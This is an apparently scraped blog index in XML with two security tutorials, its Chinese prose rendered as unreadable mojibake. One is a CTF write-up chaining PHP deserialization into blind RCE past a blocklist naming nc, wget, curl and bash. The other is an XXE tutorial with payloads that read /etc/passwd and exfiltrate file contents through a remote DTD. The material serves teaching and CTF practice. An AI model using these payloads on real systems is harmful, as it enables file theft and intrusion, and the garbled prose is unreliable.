href="https://mochazz.github.io/2019/02/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bphar/#%E4%BE%8B%E9%A2%98%E4%B8%80">PHPååºåˆ—åŒ–å…¥é—¨ä¹‹phar</a></p><p><a href="https://www.cnblogs.com/CoLo/p/16786627.html">PHP Pharååºåˆ—åŒ–å­¦ä¹ </a></p><p><a href="https://threezh1.com/2019/09/09/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Pharååºåˆ—åŒ–æ€»ç»“</a></p><p><a href="https://xz.aliyun.com/t/9213?time__1311=n4+xnD0DuAG=oxGqGNnmDUxYqxEkDcAA2xmupD">PHPååºåˆ—åŒ– â€” å­—ç¬¦é€ƒé€¸</a></p><p><a href="https://xz.aliyun.com/t/9895?time__1311=n4+xnD0DuDRD9B7NDsAoxCqw0r7ei=37tH4D">é€šè¿‡CTFé¢˜ç›®å­¦ä¹ ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸</a></p><p><a href="https://cloud.tencent.com/developer/article/2226541">å¹²è´§ | èƒ½çœ‹æ‡‚çš„PHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸æ¼æ´</a></p><p><a href="https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">PHPååºåˆ—åŒ–å…¥é—¨ä¹‹sessionååºåˆ—åŒ–</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> -phpååºåˆ—åŒ– -sessionååºåˆ—åŒ– -pharååºåˆ—åŒ– -php popé“¾ -phpå­—ç¬¦ä¸²é€ƒé€¸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[NewStarCTF 2023 å…¬å¼€èµ›é“]RCE-æ— å›æ˜¾RCE</title>
      <link href="/2024/07/11/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-RCE-%E6%97%A0%E5%9B%9E%E6%98%BERCE/"/>
      <url>/2024/07/11/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-RCE-%E6%97%A0%E5%9B%9E%E6%98%BERCE/</url>
      
        <content type="html"><![CDATA[<h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-R-C-E"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-R-C-E" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]R!!!C!!!E!!!"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]R!!!C!!!E!!!</h1><p>è¿™é“é¢˜æ˜¯ååºåˆ—åŒ–+æ— å›æ˜¾RCE</p><p>å…³é”®ç‚¹ï¼š<a href="https://blog.csdn.net/G_D0120/article/details/136567416">teeå‘½ä»¤</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$this</span>-&gt;code))&#123;</span><br><span class="line">            <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;alright&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;qwejaskdjnlka;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//wanna try?</span></span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>æºç å¦‚ä¸Šï¼Œä¸€çœ¼å°±æ˜¯ååºåˆ—åŒ–ï¼Œç›´æ¥æ„é€ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$this</span>-&gt;code))&#123;</span><br><span class="line">            <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;alright&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;qwejaskdjnlka;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$m</span>=<span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>(); <span class="comment">//åˆ›å»ºå¯¹è±¡</span></span><br><span class="line"><span class="variable">$m</span>-&gt;qwejaskdjnlka=<span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();  <span class="comment">//è§¦å‘__toString()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$m</span>);  <span class="comment">//åºåˆ—åŒ–å¯¹è±¡</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å½“æˆ‘äº¤ä¸Šå»çš„æ—¶å€™å‘ç°æ²¡æœ‰å›åº”</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407111110617.png" alt="img"></p><p>ä¸€ç›´ä»¥ä¸ºæ˜¯æ²¡æœ‰æ‰§è¡ŒæˆåŠŸï¼Œåæ¥ç»è¿‡å¤§ä½¬æŒ‡ç‚¹æ‰çŸ¥é“æ˜¯<strong>æ— å›æ˜¾</strong>ï¼Œé‚£ä¹ˆæ— å›æ˜¾RCEè¯¥æ€ä¹ˆåˆ©ç”¨å‘¢ï¼Œå°±æ˜¯æŠŠæ‰§è¡Œç»“æœè¾“å‡ºåˆ°ä¸€ä¸ªæ–‡ä»¶é‡Œï¼Œç„¶åè®¿é—®è¿™ä¸ªæ–‡ä»¶å°±å¯ä»¥äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;ls /|t&#x27;&#x27;ee 1&quot;</span>; <span class="comment">//teeå‘½ä»¤è¾“å‡ºåˆ° 1 æ–‡ä»¶ï¼Œç”¨&#x27;&#x27;ç»•è¿‡</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$this</span>-&gt;code))&#123;</span><br><span class="line">            <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;alright&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;qwejaskdjnlka;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$m</span>=<span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"><span class="variable">$m</span>-&gt;qwejaskdjnlka=<span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$m</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407111116995.png" alt="img"></p><p>ç„¶åæ‰§è¡Œcat &#x2F;flag_is_h3eeere|tâ€™â€™ee 1å‘½ä»¤ï¼Œç›´æ¥è¯»å–flag</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407111120971.png" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> -RCE -ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXEå¤–éƒ¨æ³¨å…¥å®ä½“æ¼æ´_php</title>
      <link href="/2024/07/10/XXE%E5%A4%96%E9%83%A8%E6%B3%A8%E5%85%A5%E5%AE%9E%E4%BD%93%E6%BC%8F%E6%B4%9E-php/"/>
      <url>/2024/07/10/XXE%E5%A4%96%E9%83%A8%E6%B3%A8%E5%85%A5%E5%AE%9E%E4%BD%93%E6%BC%8F%E6%B4%9E-php/</url>
      
        <content type="html"><![CDATA[<h1 id="XXEå¤–éƒ¨å®ä½“æ¼æ´"><a href="#XXEå¤–éƒ¨å®ä½“æ¼æ´" class="headerlink" title="XXEå¤–éƒ¨å®ä½“æ¼æ´"></a>XXEå¤–éƒ¨å®ä½“æ¼æ´</h1><h2 id="XMLå’ŒDTD"><a href="#XMLå’ŒDTD" class="headerlink" title="XMLå’ŒDTD"></a>XMLå’ŒDTD</h2><h3 id="XMLä¸HTMLçš„åŒºåˆ«"><a href="#XMLä¸HTMLçš„åŒºåˆ«" class="headerlink" title="XMLä¸HTMLçš„åŒºåˆ«"></a>XMLä¸HTMLçš„åŒºåˆ«</h3><p>XMLæ˜¯è¢«è®¾è®¡ä¸ºä¼ è¾“å’Œå­˜å‚¨æ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å†…å®¹</p><p>HTMLè¢«è®¾è®¡ç”¨æ¥æ˜¾ç¤ºæ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å¤–è§‚</p><p>HTMLä¸»è¦æ˜¯æ˜¾ç¤ºä¿¡æ¯ï¼Œè€ŒXMLä¸»è¦ä¼ è¾“ä¿¡æ¯</p><p>æ‰€ä»¥ï¼Œå¦‚æœä¸ä¸¥è°¨çš„è¯ï¼Œå°±ä¼šé€ æˆXMLå»ä¼ è¾“ä¸€äº›æ¶æ„çš„ä¿¡æ¯</p><h3 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>XXEæ¼æ´å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£æXMLè¾“å…¥æ—¶ï¼Œæ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œå¯¼è‡´å¯åŠ è½½æ¶æ„å¤–éƒ¨æ–‡ä»¶ï¼Œé€ æˆæ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ‰«æã€æ”»å‡»å†…ç½‘ç½‘ç«™ã€å‘èµ·dosæ”»å‡»ç­‰å±å®³ã€‚xxeæ¼æ´è§¦å‘çš„ç‚¹å¾€å¾€æ˜¯å¯ä»¥ä¸Šä¼ xmlæ–‡ä»¶çš„ä½ç½®ï¼ˆå°±æ˜¯æœ‰ä¸Šä¼ xmlæ–‡ä»¶çš„å…¥å£ç‚¹ï¼‰ï¼Œæ²¡æœ‰å¯¹ä¸Šä¼ çš„xmlæ–‡ä»¶è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´å¯ä¸Šä¼ æ¶æ„xmlæ–‡ä»¶ã€‚</p><h3 id="XMLçš„æ ¼å¼"><a href="#XMLçš„æ ¼å¼" class="headerlink" title="XMLçš„æ ¼å¼"></a>XMLçš„æ ¼å¼</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt; //å£°æ˜XMLæ–‡æ¡£</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;//DTDæ–‡æ¡£å®šä¹‰ç±»å‹</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;//æ–‡æ¡£å…ƒç´ ï¼Œå…ƒç´ æ˜¯è‡ªç”±è®¾å®šçš„ã€‚</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt; //ä½†æ˜¯ä¸€å®šè¦æœ‰æ ¹å…ƒç´ å’Œåˆ†æ”¯ï¼Œå¹¶ä¸”æ­£ç¡®åµŒå¥—</span><br><span class="line">&lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="DTDï¼ˆæ–‡æ¡£å®šä¹‰ç±»å‹ï¼‰-å®ä½“"><a href="#DTDï¼ˆæ–‡æ¡£å®šä¹‰ç±»å‹ï¼‰-å®ä½“" class="headerlink" title="DTDï¼ˆæ–‡æ¡£å®šä¹‰ç±»å‹ï¼‰-å®ä½“"></a>DTDï¼ˆæ–‡æ¡£å®šä¹‰ç±»å‹ï¼‰-å®ä½“</h3><p><strong>å®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ã€‚</strong></p><p><strong>å®ä½“å¼•ç”¨æ˜¯å¯¹å®ä½“çš„å¼•ç”¨ã€‚</strong></p><p><strong>å®ä½“å¯åœ¨å†…éƒ¨æˆ–å¤–éƒ¨è¿›è¡Œå£°æ˜ã€‚</strong></p><h5 id="ä½œç”¨æ˜¯å®šä¹‰XMLæ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—ï¼Œå¯å†…éƒ¨å£°æ˜ï¼Œä¹Ÿå¯å¤–éƒ¨å¼•ç”¨ï¼Œè¿™ä¸ªä¹Ÿæ˜¯å¤–éƒ¨å®ä½“æ³¨å…¥çš„å…³é”®åœ°æ–¹"><a href="#ä½œç”¨æ˜¯å®šä¹‰XMLæ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—ï¼Œå¯å†…éƒ¨å£°æ˜ï¼Œä¹Ÿå¯å¤–éƒ¨å¼•ç”¨ï¼Œè¿™ä¸ªä¹Ÿæ˜¯å¤–éƒ¨å®ä½“æ³¨å…¥çš„å…³é”®åœ°æ–¹" class="headerlink" title="ä½œç”¨æ˜¯å®šä¹‰XMLæ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—ï¼Œå¯å†…éƒ¨å£°æ˜ï¼Œä¹Ÿå¯å¤–éƒ¨å¼•ç”¨ï¼Œè¿™ä¸ªä¹Ÿæ˜¯å¤–éƒ¨å®ä½“æ³¨å…¥çš„å…³é”®åœ°æ–¹"></a>ä½œç”¨æ˜¯å®šä¹‰XMLæ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—ï¼Œå¯å†…éƒ¨å£°æ˜ï¼Œä¹Ÿå¯å¤–éƒ¨å¼•ç”¨ï¼Œè¿™ä¸ªä¹Ÿæ˜¯å¤–éƒ¨å®ä½“æ³¨å…¥çš„å…³é”®åœ°æ–¹</h5><h4 id="å†…éƒ¨å®ä½“çš„å£°æ˜"><a href="#å†…éƒ¨å®ä½“çš„å£°æ˜" class="headerlink" title="å†…éƒ¨å®ä½“çš„å£°æ˜"></a>å†…éƒ¨å®ä½“çš„å£°æ˜</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">è¯­æ³•ï¼š</span><br><span class="line">&lt;!ENTITY å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt;</span><br><span class="line"></span><br><span class="line">DTDä¸­ï¼š</span><br><span class="line">ä¾‹å­ï¼š</span><br><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;</span><br><span class="line"></span><br><span class="line">XMLä¸­ï¼š</span><br><span class="line">ä¸€ä¸ªå®ä½“ç”±ä¸‰éƒ¨åˆ†æ„æˆ: ä¸€ä¸ªå’Œå· (&amp;), ä¸€ä¸ªå®ä½“åç§°, ä»¥åŠä¸€ä¸ªåˆ†å· (;)ã€‚</span><br><span class="line">ä¾‹å­;</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure><h4 id="å¤–éƒ¨å®ä½“å£°æ˜"><a href="#å¤–éƒ¨å®ä½“å£°æ˜" class="headerlink" title="å¤–éƒ¨å®ä½“å£°æ˜"></a>å¤–éƒ¨å®ä½“å£°æ˜</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">è¯­æ³•:</span><br><span class="line">&lt;!ENTITY å®ä½“åç§° SYSTEM &quot;URI/URL&quot;&gt;</span><br><span class="line"></span><br><span class="line">DTDä¸­ï¼š</span><br><span class="line">ä¾‹å­ï¼š</span><br><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.baidu.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">XMLä¸­ï¼š</span><br><span class="line">ä¾‹å­ï¼š</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br><span class="line"></span><br><span class="line">æˆ–è€…</span><br><span class="line">&lt;!ENTITY å®ä½“åç§° PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="XMLå¤–éƒ¨å®ä½“æ³¨å…¥"><a href="#XMLå¤–éƒ¨å®ä½“æ³¨å…¥" class="headerlink" title="XMLå¤–éƒ¨å®ä½“æ³¨å…¥"></a>XMLå¤–éƒ¨å®ä½“æ³¨å…¥</h3><p>å½“å…è®¸å¼•ç”¨å¤–éƒ¨å®ä½“æ—¶ï¼Œç”±äºXMLæ³¨é‡äºæ•°æ®çš„ä¼ è¾“ï¼Œæ‰€ä»¥é€šè¿‡æ„é€ æ¶æ„å†…å®¹ï¼Œå¯å¯¼è‡´è¯»å–ä»»æ„æ–‡ä»¶ã€æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€æ¢æµ‹å†…ç½‘ç«¯å£ã€æ”»å‡»å†…ç½‘ç½‘ç«™ç­‰å±å®³ã€‚</p><h4 id="æ–¹å¼1"><a href="#æ–¹å¼1" class="headerlink" title="æ–¹å¼1:"></a>æ–¹å¼1:</h4><h4 id="é€šè¿‡åè®®æ¥å¼•ç”¨ï¼Œä¸è¿‡ä¸åŒçš„ç¨‹åºæ”¯æŒçš„åè®®ä¸ä¸€æ ·"><a href="#é€šè¿‡åè®®æ¥å¼•ç”¨ï¼Œä¸è¿‡ä¸åŒçš„ç¨‹åºæ”¯æŒçš„åè®®ä¸ä¸€æ ·" class="headerlink" title="é€šè¿‡åè®®æ¥å¼•ç”¨ï¼Œä¸è¿‡ä¸åŒçš„ç¨‹åºæ”¯æŒçš„åè®®ä¸ä¸€æ ·"></a>é€šè¿‡åè®®æ¥å¼•ç”¨ï¼Œä¸è¿‡ä¸åŒçš„ç¨‹åºæ”¯æŒçš„åè®®ä¸ä¸€æ ·</h4><h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407091426966.png" alt="img"></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test[</span><br><span class="line">    &lt;!ENTITY Y SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;user&gt;&amp;Y&lt;/user&gt;</span><br><span class="line">//ä¸Šä¼ è¯¥æ–‡ä»¶å°±ä¼šè¿”å›/etc/passwdçš„å†…å®¹</span><br></pre></td></tr></table></figure><h4 id="æ–¹å¼2ï¼š"><a href="#æ–¹å¼2ï¼š" class="headerlink" title="æ–¹å¼2ï¼š"></a>æ–¹å¼2ï¼š</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test[</span><br><span class="line">    &lt;!ENTITY Y SYSTEM &quot;http://www.baidu.com&quot;&gt;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;user&gt;&amp;Y&lt;/user&gt;</span><br></pre></td></tr></table></figure><h4 id="æ–¹å¼3ï¼ˆæ•°æ®å¤–å¸¦â€”åœ¨xxeçš„ç›²æ³¨ä¸­å¯ä»¥ä½¿ç”¨ï¼‰ï¼š"><a href="#æ–¹å¼3ï¼ˆæ•°æ®å¤–å¸¦â€”åœ¨xxeçš„ç›²æ³¨ä¸­å¯ä»¥ä½¿ç”¨ï¼‰ï¼š" class="headerlink" title="æ–¹å¼3ï¼ˆæ•°æ®å¤–å¸¦â€”åœ¨xxeçš„ç›²æ³¨ä¸­å¯ä»¥ä½¿ç”¨ï¼‰ï¼š"></a>æ–¹å¼3ï¼ˆæ•°æ®å¤–å¸¦â€”åœ¨xxeçš„ç›²æ³¨ä¸­å¯ä»¥ä½¿ç”¨ï¼‰ï¼š</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root [   </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://174.1.66.167/shell.dtd&quot;&gt;  </span><br><span class="line">%remote;  </span><br><span class="line">]&gt;  </span><br><span class="line">  </span><br><span class="line">shell.dtd  </span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://127.0.0.1:5555/?flag=%file;&#x27;&gt;&quot;&gt;  </span><br><span class="line">%int;  </span><br><span class="line">%send;</span><br></pre></td></tr></table></figure><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407091658763.png" alt="img"></p><h4 id="æ–¹å¼4ï¼ˆå†…éƒ¨DTD-å‚æ•°å¤–éƒ¨å®ä½“ï¼‰ï¼š"><a href="#æ–¹å¼4ï¼ˆå†…éƒ¨DTD-å‚æ•°å¤–éƒ¨å®ä½“ï¼‰ï¼š" class="headerlink" title="æ–¹å¼4ï¼ˆå†…éƒ¨DTD+å‚æ•°å¤–éƒ¨å®ä½“ï¼‰ï¼š"></a>æ–¹å¼4ï¼ˆå†…éƒ¨DTD+å‚æ•°å¤–éƒ¨å®ä½“ï¼‰ï¼š</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">&lt;!ENTITY %name SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span 